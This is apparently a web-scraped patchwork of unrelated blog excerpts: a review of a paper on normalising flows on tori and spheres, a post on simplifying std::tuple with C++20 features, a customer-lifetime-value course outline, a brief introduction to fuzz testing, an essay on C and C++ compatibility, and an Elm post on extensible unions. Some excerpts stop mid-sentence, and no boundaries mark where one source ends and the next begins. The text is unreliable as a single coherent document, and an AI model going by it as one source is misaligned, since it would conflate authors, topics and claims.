present a novel method for calculating normalising flows on more complex
spaces than the usual Euclidean ones. Specifically, as the title
implies, they develop methods for calculating such flows on tori and
spheres.</p>
<p>What I enjoyed about this paper is the smart way of constructing flows
iteratively: first, flows on the circle are being constructed&nbsp;(using
different concepts for defining a <a href="https://en.wikipedia.org/wiki/Diffeomorphism">diffeomorphism</a>, the most favourite of
mine being a <a href="https://en.wikipedia.org/wiki/M%C3%B6bius_transformation">Möbius transformation</a>).
Since a torus can be described as the Cartesian product of circles, this
is sufficient to describe flows on tori of arbitrary dimensions! Next,
the flows are generalised to higher-dimensional spheres.</p>
<p>While I am by no means and expert in normalising flows, I liked
reading this paper a lot. The theory is well-developed and it is another
one of those publications that shows you how to go beyond the boundaries
of what is currently possible. Moreover, I enjoyed the discussion of the
implementation details—it turns out that achieving numerical stability
here is another feat that deserves some mention!</p>

<p>This year’s ICML also featured an interesting array of topology-based
papers. Not all of them fit neatly into the field of topological data
analysis&nbsp;(TDA), but I am happy to see that the community is
starting to pick up this fundamental topic. I remain convinced that
a topology-driven perspective is needed to answer certain foundational
questions in machine learning. Here’s to the future of topology!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>When he created Go as a knee-jerk Reaction to C++11,
Rob Pike proclaimed <a href="https://commandcenter.blogspot.com/2012/06/less-is-exponentially-more.html">Less is exponentially more</a>.
While it is anyone’s guess what that is supposed to mean, in this blog post we will see how C++20 is less verbose, yet more expressive than
prior C++ versions.</p>
<p>I am a big fan of concepts-driven designs.
The use of concepts leads to less coupled, more generic interfaces that work with more types.
Take <code>std::tuple</code> for example. A tuple can be constructed from a <code>std::pair</code>. But it can’t be
constructed from a <code>QPair</code> or a <code>boost::tuple</code>. Nor can it be constructed from a <code>std::array</code>,
even if <code>std::array</code> follows the tuple protocol.
Isn’t that a bit arbitrary?</p>
<p>Shouldn’t instead construction and comparison support all objects following the tuple protocol?
Especially for comparison, if a different part of my system uses a different tuple type (of the same arity),
why should I need to do an expensive conversion to compare their <strong>value</strong> ?</p>
<p>A better question, of course, would be <em>why is <code>std::pair</code> a distinct type from <code>std::tuple</code>?</em>, the answer to that
being <em>legacy</em>, as always. Could we fix it? Probably not.</p>
<p>But anyway, this led me to propose <a href="https://wg21.link/p2165">P2165 - Comparing pair and tuples</a>.
This, in turn, led me to look at libstdc++'s tuple implementation.
That is the topic of today’s blog post.</p>
<p><code>std::tuple</code> is a C++11 addition, and like many standard types, its goal of being a universal
vocabulary type makes it quite challenging to implement.</p>
<p>You can also checkout <a href="https://medium.com/@mortificador/implementing-std-tuple-in-c-17-3cc5c6da7277">this article</a>
which explain how <code>std::tuple</code> is implemented in C++17.</p>
<p>But since then the language changed a lot, and many new features target easier library development.
Let see how C++20 can help us simplify <code>std::tuple</code>'s implementation.</p>
<h3 id="down-with-ebo">Down with EBO</h3>
<p><code>std::tuple</code> can be implemented as a recursive tuple.</p>
<div><pre><code data-lang="cpp"><span>template</span> &lt;<span>typename</span> T, <span>int</span> index&gt;
<span>struct</span> <span>Wrapper</span> {
    T type;
};

<span>template</span> &lt;<span>int</span> index, <span>typename</span> T, <span>typename</span>... Tail&gt;
<span>struct</span> <span>Tuple</span>
    : Wrapper&lt;T, index&gt;
    , Tuple&lt;index + <span>1</span>, Tail...&gt;
{
};
</code></pre></div><p>Unfortunately, we do need to explicitly define constructors to be able
to use that type, which ends up with 14 or so constructors and a few assignment operators.
Half of those being for allocator support.</p>
<p>On top of that, libstdc++ optimises for empty types:</p>
<div><pre><code data-lang="cpp"><span>struct</span> <span>empty</span>{};
<span>static_assert</span>(<span>sizeof</span>(std::tuple&lt;empty, empty&gt;) == <span>1</span>);
</code></pre></div><p>To that end, it implements <a href="https://en.cppreference.com/w/cpp/language/ebo">empty base class optimization</a></p>
<div><pre><code data-lang="cpp"><span>template</span> &lt;<span>typename</span> T, <span>int</span> index, <span>bool</span> <span>/* is the class empty */</span>&gt;
<span>struct</span> <span>Wrapper</span>;

<span>template</span> &lt;<span>typename</span> T, <span>int</span> index&gt;
<span>struct</span> <span>Wrapper</span>&lt;T, index, std::is_empty_v&lt;T&gt;&gt; {
    <span>// LOTS OF CONSTRUCTORS
</span><span></span>};

<span>template</span> &lt;<span>typename</span> T, <span>int</span> index&gt;
<span>struct</span> <span>Wrapper</span>&lt;T, index, !std::is_empty_v&lt;T&gt;&gt; {
    <span>// LOTS OF CONSTRUCTORS
</span><span></span>    T type;
};

<span>template</span> &lt;<span>int</span> index, <span>typename</span> T, <span>typename</span>... Tail&gt;
<span>struct</span> <span>Tuple</span>
    : Wrapper&lt;T, index&gt;
    , TupleImpl&lt;index + <span>1</span>, Tail...&gt;
{
    <span>// LOTS OF CONSTRUCTORS
</span><span></span>};
</code></pre></div><p>The actual libstdc++ implementation is a bit more complicated still.
Overall, about 70 lines of code - mostly duplicated - are there to
support empty objects.
This small optimization is, therefore, anything but free in terms of maintenance.
It also has some compilation cost, as more templates need to be instantiated.
Is it even worth it?</p>
<p>In C++20 all of that complexity goes away:</p>
<div><pre><code data-lang="cpp"><span>template</span> &lt;<span>typename</span> T, <span>int</span> index&gt;
<span>struct</span> <span>Wrapper</span> {
    <span>[[no_unique_address]]</span> T type;
};

<span>template</span> &lt;<span>int</span> index, <span>typename</span> T, <span>typename</span>... Tail&gt;
<span>struct</span> <span>TupleImpl</span>
    : Wrapper&lt;T, index&gt;
    , TupleImpl&lt;index + <span>1</span>, Tail...&gt;
{
};
</code></pre></div><p><code>[[no_unique_address]]</code> gives us the same optimization as Empty-Base-Class-Optimization,
without adding any complexity to our design.
Less code, more expressiveness, less maintenance.</p>
<h3 id="c20-is-more-implicit-about-being-explicit">C++20 is more implicit about being explicit.</h3>
<p>Like watermelons are mostly water, <code>std::tuple</code> is mostly constructors.
I counted 24 constructors in libstdc++'s implementation.
Let’s remove some.</p>
<p>The standard specifies that a tuple constructor is explicit if any of its
elements would have an <code>explicit</code> constructor.</p>
<div><pre><code data-lang="cpp"><span>struct</span> <span>S</span> {};
<span>struct</span> <span>E</span> { <span>explicit</span> <span>E</span>(S); };
<span>struct</span> <span>I</span> { I(S); };

std::tuple&lt;E&gt; x = S{};  <span>// ill-formed
</span><span></span>std::tuple&lt;I&gt; x = S{};  <span>// OK
</span></code></pre></div><p>Pretty neat. But how does it work ?</p>
<p>Simply by having defining 2 constructors,
one explicit and one not, and SFINAE away the one that should not be considered:</p>
<div><pre><code data-lang="cpp"><span>template</span>&lt;<span>bool</span> _Cond, <span>typename</span>... _Args&gt;
<span>using</span> _ImplicitCtor =
    __enable_if_t&lt;_TCC&lt;_Cond&gt;::<span>template</span> __is_implicitly_constructible&lt;_Args...&gt;(), <span>bool</span>&gt;;

<span>template</span>&lt;<span>bool</span> _Cond, <span>typename</span>... _Args&gt;
<span>using</span> _ExplicitCtor =
    __enable_if_t&lt;_TCC&lt;_Cond&gt;::<span>template</span> __is_explicitly_constructible&lt;_Args...&gt;(), <span>bool</span>&gt;;


<span>template</span>&lt;<span>bool</span> _NotEmpty = (<span>sizeof</span>...(_Elements) &gt;= <span>1</span>),
    _ImplicitCtor&lt;_NotEmpty, <span>const</span> _Elements&amp;...&gt; = <span>true</span>&gt;
<span>constexpr</span> tuple(<span>const</span> _Elements&amp;... __elements);

<span>template</span>&lt;<span>bool</span> _NotEmpty = (<span>sizeof</span>...(_Elements) &gt;= <span>1</span>),
    _ExplicitCtor&lt;_NotEmpty, <span>const</span> _Elements&amp;...&gt; = <span>false</span>&gt;
<span>explicit</span> <span>// This is the explicit constructor
</span><span></span><span>constexpr</span>
tuple(<span>const</span> _Elements&amp;... __elements);
</code></pre></div><p>And this is for every single constructor!
Don’t worry, this is not the way, for in C++20 <code>explicit</code> was amended to support another form: <code>explicit(boolean-expression)</code>.
As such, <code>explicit(true)</code> is equivalent to <code>explicit</code> while <code>explicit(false)</code> is not explicit.
We can then rewrite the above code as:</p>
<div><pre><code data-lang="cpp"><span>template</span>&lt;<span>bool</span> _NotEmpty = (<span>sizeof</span>...(_Elements) &gt;= <span>1</span>)&gt;
<span>explicit</span>(is_explicit_v&lt;<span>const</span> _Elements&amp;...&gt;)
<span>constexpr</span>
tuple(<span>const</span> _Elements&amp;... __elements);
</code></pre></div><p>This little trick lets us remove about 10 constructors and about 150 lines of codes. Don’t reinvent yourself!</p>
<h3 id="constrained-copy-pasta">Constrained copy-pasta</h3>
<p>With so many constructors, <code>std::tuple</code> is a template SFINAE bonanza.
So it is not surprising that the best way to improve <code>std::tuple</code> is to go all-in on C++ concepts.
Or rather, on <code>requires</code> clauses.</p>
<p>This is the code in libstdc++ for the default constructor:</p>
<div><pre><code data-lang="cpp"><span>template</span>&lt;<span>typename</span> _Dummy = <span>void</span>, _ImplicitDefaultCtor&lt;is_void&lt;_Dummy&gt;::value&gt; = <span>true</span>&gt;
<span>constexpr</span>
tuple()
<span>noexcept</span>(__and_&lt;is_nothrow_default_constructible&lt;_Elements&gt;...&gt;::value);
</code></pre></div><p>It can be rewritten using a <code>requires</code> clause easily: No <code>std::enable_if</code> wizardry.</p>
<div><pre><code data-lang="cpp"><span>explicit</span>(!(__and_&lt;__is_implicitly_default_constructible&lt;_Elements&gt;::value...&gt;::value))
<span>constexpr</span> tuple()
<span>noexcept</span>((__and_&lt;is_nothrow_default_constructible&lt;_Elements&gt;::value...&gt;::value))
<span>requires</span>((__and_&lt;std::is_default_constructible&lt;_Elements&gt;::value&gt;...&gt;::value));
</code></pre></div><p>If we look at the standard, the code above is a direct translation of the wording!
Each <code>Constraint</code> in the wording draft can be converted to a C++ constraint!</p>
<p><img src="https://cor3ntin.github.io/posts/tuple/ctr1.png" alt="Example image"></p>
<p>One other thing we should do is to use fold expressions and template variables to cut down
on the clutter. Both these are actually C++17 features!</p>
<div><pre><code data-lang="cpp"><span>explicit</span>(!(__is_implicitly_default_constructible_v&lt;_Elements&gt; &amp;&amp;...))
<span>constexpr</span> tuple()
<span>noexcept</span>((std::is_nothrow_default_constructible_v&lt;_Elements&gt; &amp;&amp;...))
<span>requires</span>((std::is_default_constructible&lt;_Elements&gt; &amp;&amp;...));
</code></pre></div><p>Because <code>requires</code> clauses make it a lot easier to express constraint, and allow us to
implement the standard line by line, we can remove a lot of code while increasing
readability!</p>
<p>You could wonder about the cost of all these concepts on compile-time,
that would be very legitimate indeed.
Concepts are in fact a bit taxing on compilers.
They are however not as costly than the equivalent <code>enable_if</code> machinery,
so these transformations end up having no negative impact on compile times.</p>
<h3 id="a-pair-by-any-other-name-would-compile-just-as-fast">A pair by any other name would compile just as fast</h3>
<p>Because a tuple is constructible from a <code>std::pair</code>, libstdc++ elects to specialize tuple for 2
elements, for the sake of these additional constructors.
But what is a pair, if not a tuple?
Following this logic, we could remove that entire specialization, a whopping 360 lines of code.
So satisfying!</p>
<p>We could also keep the constructors for pair by simply adding a <code>requires (sizeof...(_Elements) == 2)</code>
to these constructors, no need for specialization!</p>
<h3 id="-nothing-as-futuristic-as-a-spaceship">🛸 Nothing as futuristic as a spaceship!</h3>
<p>Tuple provides all the comparison operators which are implemented in about 100 lines of code.
We can replace them by 2 functions, <code>operator==</code> and <code>operator&lt;=&gt;</code>:</p>
<div><pre><code data-lang="cpp"><span>template</span> &lt;<span>typename</span>...Elem, <span>typename</span>...OElem, <span>template</span> &lt;<span>typename</span>...&gt; <span>typename</span> B&gt;
<span>requires</span> (tuple_like&lt;B&lt;OElem...&gt;&gt;  &amp;&amp; <span>sizeof</span>...(Elem) == <span>sizeof</span>...(OElem))
<span>bool</span> <span>operator</span>==(<span>const</span> tuple&lt;Elem...&gt; &amp; a, <span>const</span> B&lt;OElem...&gt; &amp; b) {
    <span>return</span> [&amp;]&lt;std::size_t... I&gt;(index_sequence&lt;I...&gt;)
    {
        <span>return</span>  ((std::get&lt;I&gt;(a) == std::get&lt;I&gt;(b)) &amp;&amp; ...);
    }
    (std::make_index_sequence&lt;<span>sizeof</span>...(Elem)&gt;{});
}

<span>template</span> &lt;<span>typename</span>...Elem, <span>typename</span>...OElem, <span>template</span> &lt;<span>typename</span>...&gt; <span>typename</span> B&gt;
<span>requires</span> (tuple_like&lt;B&lt;OElem...&gt;&gt;  &amp;&amp; <span>sizeof</span>...(Elem) == <span>sizeof</span>...(OElem))
<span>auto</span> <span>operator</span>&lt;=&gt;(<span>const</span> tuple&lt;Elem...&gt; &amp; a, <span>const</span> B&lt;OElem...&gt; &amp; b) {
    <span>using</span> ret = common_comparison_category_t&lt;__detail::__synth3way_t&lt;Elem, OElem&gt;...&gt;;
    <span>return</span> [&amp;]&lt;std::size_t... I&gt;(index_sequence&lt;I...&gt;)
    {
        ret c = ret::equivalent;
        <span>// http://eel.is/c++draft/expos.only.func#2
</span><span></span>        <span>return</span>  ((c = synth3way(std::get&lt;I&gt;(a), std::get&lt;I&gt;(b)), c != <span>0</span>) || ...), c;
    }
    (std::make_index_sequence&lt;<span>sizeof</span>...(Elem)&gt;{});
}
</code></pre></div><p>Both these functions will support comparing a tuple to any <em>tuple-like</em> object.
They could be hidden friends, which would improve compile times, if not for the dependency
on <code>std::get</code>.</p>
<p>To implement them, I have used a few C++20 features.
Notably, generic lambdas, which are of the form: <code>[]&lt;_template-parameters_&gt;(){}</code>.
These allow us to unpack the tuple to make use of fold expressions directly in the functions.
Notice also the <code>requires</code> clause.
In the definition of <code>operator&lt;=&gt;</code> a nasty comma expression is used to return when 2
elements compare equal.
I understand this style might appear novel, maybe even scary, but properly documented
it is easier to document than something which relies on a lot of <code>enable_if</code> and other meta-programming heavy
approaches.</p>
<p>Interestingly these functions are not constrained by the standard.</p>
<h2 id="we-cant-have-nice-things">We can’t have nice things</h2>
<p>Using these tricks, I shaved over 700 lines from <code>&lt;tuple&gt;</code>; Almost a third.
And I am sure tons of improvements could still be made.
I probably introduced a few bugs doing this experiment, but I feel like I made the …</p></div></div>

Let’s get into the data science behind customer lifetime value. There are several ways to calculate CLV, with models differing in accuracy at the aggregate and individual levels. Some models require historical data, while others can predict CLV early in the customer journey.
This course begins with the basics of customer lifetime value, then it dives deeper into various models for calculating and predicting CLV.

Let’s start at the beginning. Customer Lifetime Value (CLV) is a metric that estimates how much value (usually revenue or profit margin) any given customer will bring to your business over the course of the total time they interact with your brand—past, present, and future.
This course is an introduction to CLV for business analysts, c-suite executives, growth marketers, data scientists, and anyone in between.

<h3>What Is Customer Lifetime Value?</h3>
</p>
<p>
The very first course in the CLV Academy provides an overview of customer lifetime value. What is it? Why is it important? What problems can CLV solve for your business? You can dive deeper into many of these ideas in later lessons.

<h3>Why Calculate CLV at the Individual Level</h3>
</p>
<p>
The most commonly used customer lifetime value models benchmark their strengths on aggregate statistics. Yet, most business use cases for CLV require accuracy at the individual level. You can see the problem.

<h3>Visualizations for Customer Lifetime Value</h3>
</p>
<p>
You can use customer lifetime value metrics across the organization, from marketing and sales to product and customer service. For cross-functional alignment, visualizations are a helpful tool to share customer data science with other teams.

<h3>Lookalike Strategies Powered by CLV</h3>
</p>
<p>
Ad platforms allow advertisers to target new users with lookalike audiences. However, the out-of-the-box solution falls short because all of your customers aren’t alike. With customer lifetime value, you can create more effective lookalike audiences for acquisition.

<h3>Optimize Your Marketing Budget</h3>
</p>
<p>
Between acquisition and retention campaigns to content marketing and brand development, it’s difficult to know where to spend your limited marketing dollars. Individual customer lifetime value metrics take the guesswork out of budgeting so you can optimize your spend in real time.

<h3>CLV Migration Over Time</h3>
</p>
<p>
Customer lifetime value is not a static metric. It changes over time—sometimes dramatically—as you observe new data about a customer. By tracking how CLV changes over time, you can determine what product features, retention campaigns, customer service practices, and more impact lifetime value.

<p>For those who are unfamiliar with the term or practice of <strong><em>Fuzz Testing</em></strong>, it’s essentially the combination of testing input validation coupled with stress testing, which is performed by spraying inputs of a target device, application, or system with random and crafted input at high velocity and observing the effects on the target. Use cases can involve testing input forms on a website to ensure it doesn’t accept foreign or script characters or ensuring that IIoT devices are programmed to be functionally robust.</p>



<p>I’ve performed fuzz testing for many web &amp; mobile applications, and even industrial networks and devices. There are common denominators amongst fuzz tests of different technology or hardware stacks that map to higher level processes that translate well across the board and can be universally applied. Many fuzzing frameworks claim to be unified, but are only such when employed in their respective technology silo(s). As someone who works simultaneously in very low <em>and</em> high levels of varying engagements, I tend never to work, research, or experiment in a vacuum. And so the thought of having to find and apply fuzzing frameworks <em>a la carte</em> aggravates the living shit out of me, as It’s an inefficient and misapplied expenditure of effort (i.e. a waste of time).</p>



<p>I wanted to provide something of value that others who need to perform fuzz testing of <em>anything</em> can use from front-to-end, and even build off + flesh out as seen fit by those planning and/or testing. I just wanted to make your life easier. Enjoy!!</p>

September 1, 2020 | https://cor3ntin.github.io/posts/c/ | <a href="https://web.archive.org/web/*/https://cor3ntin.github.io/posts/c/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p><img src="https://cor3ntin.github.io/posts/c/fight.jpeg" alt="Fish"></p>
<p>In the early 70s, C was created at Bell Labs as a byproduct of the development of UNIX.
It quickly became one of the most popular programming languages.
But it was not expressive enough for Bjarne Stroustrup.
And so, in 1983, as a byproduct of his Ph.D. thesis, he extended C.</p>
<p>C with classes was born.</p>
<p>At the time, Bjarne Stroustrup understood that a programming language has many components,
not only the language, its compiler, but also a linker and libraries.
Offering a familiar tool also makes adoption easier.
In this historical context, it makes sense that C++ would be based on C.</p>
<p>Fast-forward 40 years later.</p>
<p>Both C and C++ are widely used in the industry.
But go 5 minutes on the Internet and C developers will tell you that C++ is the most horrific man-made creation,
while many C++ developers wait for the day when C finally burns in the hot flames of hell.</p>
<h2 id="so-what-happened">So what happened?</h2>
<p>On the surface, C and C++ cater to the same use cases: high performance, deterministic, native but portable code for the widest range of hardware and applications.</p>
<p>But C is proudly a low-level language. A nicer assembly.</p>
<p>From day one, C++ had magic. Dark witchcraft: destructors. Suddenly the compiler was doing things on its own.
It also had type inference very early on, but the developers of the mid-80s were not quite ready for that and Bjarne Stroustrup
was pressured into removing <code>auto</code>, until it was added back to C++11.</p>
<p>From then, C++ got more and more tools to build abstractions.
I don’t think it would be fair to say that C++ is a low-level or high-level language. It’s both, by design.
But building high-level abstractions while not sacrificing performance is hard.
C++ then needed tools to achieve that: <code>constexpr</code>, move semantics, templates, and an ever-growing standard library.</p>
<p>Fundamentally I think C trusts developers while C++ trusts compilers.
This is a massive difference that sharing the same native types or syntax for while loop cannot hide.</p>
<p>C++ developers blame C for all their lost limbs, while C developers probably think C++ is batshit crazy.
I imagine that is a fair perspective if you look at C++ through a C lense. C++ is pretty wild <em>as a superset of C</em>.
A seasoned C person looking at C++ expecting familiarity in C++ will not find it. C++ is not C.
This is enough to feed flamewars for generations.</p>
<p>But as much as I dislike C, I don’t have any legitimacy to make fun of it. See, I have some experience with C++ but I
wrote very little C. It was probably bad C.
A language is also its good practices, patterns, idioms, and these take years to learn. If you try to write C code like it’s C++ or C++ like it is C, you will have a bad time.
Knowing <a href="https://www.youtube.com/watch?v=YnWhqhNdYyk">C doesn’t teach you C++</a>. Knowing C++ does not teach you C.</p>
<p>So can we all stop saying C/C++, regret the unfortunate naming, and sing kumbaya in harmony?
Not so fast.</p>
<p>See, despite being philosophically different from C, C++ is still somewhat a superset of C.
That is to say, you can include a C header in a C++ translation unit and that should compile.
And this is where it gets messy.</p>
<p>C++ is not an extension of C.
It is designed as a separate standard, by a different committee, different people.
Logically, people who like C++'s philosophy will get involved in the C++ community and the C++ standardization process
while other people might try to get involved with C.
Committees, whether its C’s or C++'s, only manifest intent and direction through their respective end-product: the standards; standards which are the fruits of numerous voting.</p>
<p>At the same time, it is difficult for a compiler to know that it is dealing with a C header or a C++ header.</p>
<p><code>extern "C"</code> is not used consistently and only affects mangling, but neither grammar nor semantics.
And headers only exists in the eyes of the preprocessor, for a C++ compiler, everything is a C++ translation unit, and therefore C++.
And yet, people include C headers in C++ and expect it to “just work” ™️.
Which it mostly does.</p>
<p>We can wonder then,</p>
<h2 id="how-c-maintains-c-compatibility-while-being-developed-by-different-people-in-different-places">How C++ maintains C compatibility while being developed by different people in different places?</h2>
<p>Badly, I’m afraid.</p>
<p>A coworker recently reminded me of Conway’s law:</p>
<blockquote>
<p>Any organization that designs a system (defined broadly) will produce a design whose structure is a copy of the organization’s communication structure</p>
</blockquote>
<p>By that logic, it would stand to reason that if the two committees don’t interoperate,
neither would the languages they produce.</p>
<p>C++ maintains a list of <a href="http://eel.is/c++draft/diff.iso">incompatibilities with C</a> and <a href="http://eel.is/c++draft/diff.library">its standard library</a>.
This list does not seem to reflect the many features that were added to C11 and C18 but are not valid C++ constructs. <a href="https://en.wikipedia.org/wiki/Compatibility_of_C_and_C%2B%2B">Wikipedia</a> draws a clearer picture.</p>
<p>Listing incompatibilities isn’t sufficient to get a measure of incompatibilities between both languages.</p>
<p>Functions that exist in the C++ standard library but whose primary declaration is expected to come from C are difficult to make <code>constexpr</code>, and more difficult still to make <code>noexcept</code>.
C compatibility translates to performance costs and C functions are optimization barriers.</p>
<p>Many C constructs are valid C++ but should never pass a code review (<code>NULL</code>, <code>longjmp</code>, <code>malloc</code>, create/destroy functions, <code>free</code>, C  casts), etc.</p>
<p>These might not be bad C idioms, but they are bad C++. C++ has a stronger type system,
and unfortunately using C idioms punch a giant hole in that type system, and so C compatibility has a cost in terms of safety.</p>
<p>Don’t get me wrong, C++ still care about C compatibility. Somewhat.
And interestingly C cares about C++. Somewhat.
Truth be told, C might care about C++ more than C++ cares about C.
So each committee cares somewhat about what the other does.
We care reluctantly.</p>
<p>See, C++ is aware of the many foundational libraries written in C, not only the <code>libc</code> but also <code>zip</code>, <code>png</code>, <code>curl</code>, <code>openssl</code> (!), and countless others, which are used in many, many C++ projects.
We can’t break that.</p>
<p>But recently, especially over the past decade, C++ has become much bigger than C.
C++ has more users - and a much more active community: <a href="https://nullprogram.com/blog/2018/11/21/">There Are No C Conferences</a>.
Maybe that’s why the C++ committee is now over 10 times the size of the C committee.</p>
<p>C++ then is a force to be reckoned with and the C committee has to consider not breaking C++.
To the point that if a standard would track another, these days, C++ leads and C follow.</p>
<p>C++ is now on a steady three years cycle come rain or shine, or deadly pandemics.
Meanwhile, C has a major release every decade or so.
This makes sense. As a lower-level language, C doesn’t need to evolve as fast.</p>
<p>The C landscape is also rather different from the C++ landscape.
C caters to more platforms and a lot more compilers.
Everybody and their dog is writing C compilers because the language has a surface area small enough to make that possible, whereas the C++ committee will only really consider 4 implementations, all of which are represented at every meeting.
As a result, many features in C are implementation-defined or optionally supported so that the variety of compilers that exist can claim conformance without doing much work, which I’m told pleases regulatory bodies.</p>
<p>C++ these days is more interested in portability than implementation freedom. Yet another difference of philosophy.</p>
<h2 id="so-your-proposal-breaks-c-compatibility">So, your proposal breaks C compatibility</h2>
<p>Parts of my <a href="http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2020/p2178r1.pdf">P2178</a> paper theoretically affects C compatibility.
In such cases, none of the options seems satisfactory.</p>
<p>You could be told that you have to first get your feature into C. Which means more meetings.
Meetings you might not be able to attend because C has strict <a href="https://thephd.github.io/follow-the-river-wg14-ithaca-2019">attendance rules</a> - Excluding individuals not willing to put down thousands of dollars to become ISO members.
This is because the C committee is forced to adhere strictly to ISO rules.</p>
<p>It might also take a decade if the standard just shipped.
And most importantly, it might go nowhere if the C committee doesn’t understand or doesn’t care about the particular problem you are trying to solve.
And they probably don’t have the bandwidth to deal with it.
And you may not have the bandwidth to deal with C. After all, you joined C++ to improve C++.
In fact, if the room invites you to “talk to the C committee”, it is likely your proposal is dead, even in the unlikely event that no one in the room was against it.</p>
<p>Another likely scenario is that the C committee accepts a version of a proposal that is slightly different from what exists in C++.
<code>true</code>? Let’s make that a macro. <code>char16_t</code> ? Let’s make that a typedef. <code>char32_t</code>? Not necessarily UTF-32. <code>static_assert</code> ? <code>_Static_assert</code>.</p>
<p>The list goes on. Should we blame C? Probably not. Their committee does what they think is best for their language.
The opposite is true too. In C++20 designated initializers were inspired by C’s but are slightly different because they would otherwise not fit with the C++ initialization rules.</p>
<p>I am part of the problem. C has VLAs. I would vote against a proposal to adopt that in standard C++, <a href="https://www.phoronix.com/scan.php?page=news_item&amp;px=Linux-Kills-The-VLA">too many security issues</a>. A proposal to add <code>_Generic</code> to C++ would be over-my-dead-body. I am not sure if <code>_Generic</code> attempts to palliate to the lack of template or the lack of overloads, but C++ has both these features - from my point of view <code>_Generic</code> doesn’t fit into the big picture of what I imagine C++ to be.</p>
<p>Both committees seem also inconsistent in how much they care about the other language.
Sometimes we go to great lenghts (<a href="https://en.cppreference.com/w/cpp/numeric/complex">std::complex</a>), sometimes we don’t care at all (<a href="https://en.cppreference.com/w/c/language/array">static array parameters</a>).</p>
<p>There is no way around this. Don’t forget that each committee is a bunch of people
voting at different times in different rooms and trying to control the outcome would defeat the purpose
of having a vote.
Putting people in the same room is not realistic either. ISO might object and the participation inbalance
would put C people at an enormous disadvantage.</p>
<h2 id="c-compatibility-doesnt-matter-kinda">C compatibility doesn’t matter, kinda</h2>
<p>If you are a C developer, I imagine you see C as a neat programming language.
But for the rest of us, C is something else.</p>
<p>C is the universal, cross-language glue that ties it all together.</p>
<p>For C++ users, C is …</p></div></div>

<p>This is an exploratory post of what extensible unions (a.k.a. polymorphic variants) might look like in Elm. This mainly a post to plant a seed in the minds of the collective Elm community and is not a call to action that they need to be implemented in Elm (although I would really really really love if they were).</p>
<p>One-line headline: I think extensible unions not only fill in a missing abstract corner of Elm’s type system (rather than being a entirely novel extension to its type system), but also solve many real-world problems affecting Elm codebases today, all without compromising and indeed augmenting the Elm compiler’s excellent way of guiding users through refactors.</p>
<p>This post is jumping off a separate post <a href="https://discourse.elm-lang.org/t/how-to-represent-many-subsets-of-an-enum/6088/22">here</a> with some folks who were interested in a deeper explanation of extensible unions/polymorphic variants.</p>
<p>This post ended up being <strong>really</strong> long, so I apologize for its length in advance, but I do hope that people find it useful.</p>
<p>Because of its length I’ll just lead off with a high-level summary.</p>
<p>Polymorphic variants or extensible union types are to normal Elm union types (e.g.&nbsp;<code>type MyUnionType = UnionVariant0 | UnionVariant1 | UnionVariant2</code>) what records and extensible records are to normal Elm product types (e.g.&nbsp;<code>type MyProductType = ProductType TypeOfElement0 TypeOfElement1 TypeOfElement2</code>).</p>
<p>As such they allow for many of the same benefits that records and extensible records bring to input types of functions and modularizing Elm models, to output types of functions and modularizing Elm messages and update functions.</p>
<p>This post is split up into the following sections:</p>
<ul>
<li><a href="#what-are-extensible-union-types">What are extensible union types</a>: A introduction to some pseudo-Elm to help familiarize people with what extensible unions are. If you already know what extensible unions/polymorphic variants are you can skip this. <strong>The crucial take away is that we already have the equivalent of extensible unions for products, i.e.&nbsp;extensible records. This is just filling in a hole for current union types.</strong></li>
<li><a href="#what-are-the-benefits-of-extensible-unions">What are the benefits of extensible unions (the basics)</a>: Walking through some basic, contrived cases where extensible unions can come in handy.</li>
<li><a href="#everyday-elm-cases">Everyday Elm cases</a>: A non-exhaustive list of case studies of where extensible unions can help in code you’re likely to see in real Elm codebases.
<ul>
<li>Reminding you when you forget certain output cases for decoding</li>
<li>Unifying different error types</li>
<li>Modular Elm code: Unifying NoMap, OutMsg, and Translator</li>
</ul></li>
<li><a href="#drawbacks">Drawbacks and things-you-might-think-are-drawbacks-but-aren’t (a.k.a. literature review of other implementations)</a>: A dive into some cons and not-really-cons of extensible unions as well as how they’re implemented in other languages (mainly OCaml).</li>
</ul>

<p>Let’s begin with a very short primer on union (a.k.a. sum types) and product types. We’ll approach them individually even though in Elm we can mix and match them together in a single type declaration. This hopefully will make some of the later presentation of extensible union types a little easier to follow.</p>
<p>Union types are those types that express an “or” relationship among its type constructors.</p>
<div id="cb1"><pre><code><span id="cb1-1"><a href="#cb1-1"></a><span>-- MyColor is Red *or* Green *or* Blue</span></span>
<span id="cb1-2"><a href="#cb1-2"></a><span>type</span> <span>MyColor</span> <span>=</span> <span>Red</span> <span>|</span> <span>Green</span> <span>|</span> <span>Blue</span></span></code></pre></div>
<p>Product types are those types that express an “and” relationship in its (single) type constructor.</p>
<div id="cb2"><pre><code><span id="cb2-1"><a href="#cb2-1"></a><span>-- MyUserType is a MyUser that consists of a String *and* another String (maybe</span></span>
<span id="cb2-2"><a href="#cb2-2"></a><span>-- a first and last name)</span></span>
<span id="cb2-3"><a href="#cb2-3"></a><span>type</span> <span>MyUserType</span> <span>=</span> <span>MyUser</span> <span>String</span> <span>String</span></span></code></pre></div>
<p>These two kinds of types are dual, i.e.&nbsp;complements, to one another, where you’ll see each of them playing “opposite” roles in a lot of circumstances. We’ve already seen one example here, whereas a union type can have multiple type constructors, only one of which can be used at any given time for a single value (i.e.&nbsp;only one of <code>Red</code>, <code>Green</code>, or <code>Blue</code> can be in use for a single value of type <code>MyColor</code>), a product type has a single constructor with multiple fields, all of which must be filled in for a single value (for any value of <code>MyUserType</code> both strings must be provided to <code>MyUser</code>). Notice the inverted relationship between multiple and single between the two (i.e. multiple type constructors vs single type constructor and single variant in use vs multiple fields must all be filled in). This sort of “dual” inversion will show up a lot more later on.</p>
<p>Even though the two are complements to one another, statically typed programming languages in general seem to favor product types over union types. You see this with languages like Java that allow for the creation of product types (i.e.&nbsp;Java classes), but have no union types. Statically typed FP languages such as Elm address this imbalance by also allowing union types. This unlocks a host of data modeling goodies and is the core of how Elm allows us to create “correct by construction” models that make errors unrepresentable.</p>
<p>Elm, however, goes further than some other statically typed FP languages and bestows more power to product types through record types and extensible record types. These essentially are product types on steroids. To see that records are fundamentally product types, note that you could in theory replace every record type with a product type, it’d just make for really annoying code because all of a sudden your fields are all anonymous and position-based.</p>
<p>However, Elm, in a fashion that somewhat echoes Java’s choice to disadvantage union types, doesn’t provide equivalent power to union types. The rest of this post is an exploration in what that might look like if Elm did.</p>
